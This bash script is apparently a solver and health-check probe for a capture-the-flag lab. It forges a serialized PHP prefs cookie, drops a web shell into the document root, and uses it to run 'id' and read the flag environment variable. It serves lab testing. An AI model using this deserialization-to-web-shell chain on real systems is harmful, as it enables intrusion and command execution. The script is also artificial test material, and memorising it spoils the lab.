#!/usr/bin/env bash
# w19 blob-forge :: self-verifying probe.
#
#   ./probe.sh                       # http://localhost:30019
#   ./probe.sh http://host:port
#
# Asserts the landing page serves, that a *benign* prefs blob round-trips
# through /api/prefs (so a passing payload check cannot be a false positive),
# that the flag is NOT reachable on any pre-existing route, and that the forged
# blob drops a working shell that can print the flag.
set -uo pipefail

BASE="${1:-http://localhost:30019}"
HERE="$(cd "$(dirname "$0")" && pwd)"
fail=0

# Git Bash (MSYS) rewrites POSIX-looking arguments into Windows paths, which
# would turn the payload's `-p /var/www/html/shell.php` into a Windows path and
# put the shell outside the document root. It also makes `pwd` report /c/Users/...
# which a native Windows PHP cannot open. Scope the fix to the php call only --
# exporting MSYS_NO_PATHCONV globally breaks curl's `-o /dev/null`. Both are
# MSYS-only concerns; cygpath exists only there.
PHP="php"
if command -v cygpath >/dev/null 2>&1; then
  HERE="$(cygpath -w "$HERE")"
  PHP="env MSYS_NO_PATHCONV=1 php"
fi

check() { # check <label> <expected-substring> <actual>
  if [[ "$3" == *"$2"* ]]; then
    printf '  ok   %s\n' "$1"
  else
    printf '  FAIL %s\n       expected to contain: %s\n       got: %s\n' "$1" "$2" "$3"
    fail=1
  fi
}

printf '[*] target %s\n' "$BASE"

# 1. Landing + health.
check "landing serves the lab marker" 'name="lab" content="w19"' "$(curl -s "$BASE/")"
check "health reports the service"    '"lab":"w19"'             "$(curl -s "$BASE/api/health")"

# 2. A benign blob round-trips: decode works, and this is not an error path.
BENIGN=$(printf 'a:1:{s:5:"theme";s:4:"dark";}' | base64 -w0)
check "benign prefs blob round-trips" '"theme":"dark"' "$(curl -s -b "prefs=$BENIGN" "$BASE/api/prefs")"
check "empty cookie is reported, not echoed" 'no prefs cookie' "$(curl -s "$BASE/api/prefs")"

# 3. The flag is NOT exposed on any route the lab ships with.
LEAK=$(curl -s "$BASE/" "$BASE/api/prefs" "$BASE/api/health" "$BASE/" | grep -o 'hex4b0t{[^}]*}' | head -1)
check "flag is absent from pre-existing routes" '' "$LEAK"

# 4. Forge -> drop -> execute.
# Absolute path inside the document root: the write is verbatim, so a bare
# "/shell.php" would land at the filesystem root and never be served.
PAYLOAD=$($PHP "$HERE/payload.php" -p /var/www/html/shell.php -f "$HERE/shell.txt") || {
  printf '  FAIL payload.php did not run\n'; printf '\n[!] w19 probe FAILED\n'; exit 1; }
curl -s -b "prefs=$PAYLOAD" "$BASE/api/prefs" >/dev/null
check "dropped shell is served" 'uid=' "$(curl -s --get --data-urlencode 'x=id' "$BASE/shell.php")"

FLAG=$(curl -s --get --data-urlencode 'x=printenv W0B_FLAG' "$BASE/shell.php" | grep -o 'hex4b0t{[^}]*}' | head -1)
check "shell reads W0B_FLAG" 'hex4b0t{' "$FLAG"

if [[ $fail -eq 0 ]]; then
  printf '\n[+] w19 solvable :: %s\n' "$FLAG"
else
  printf '\n[!] w19 probe FAILED\n'
fi
exit $fail
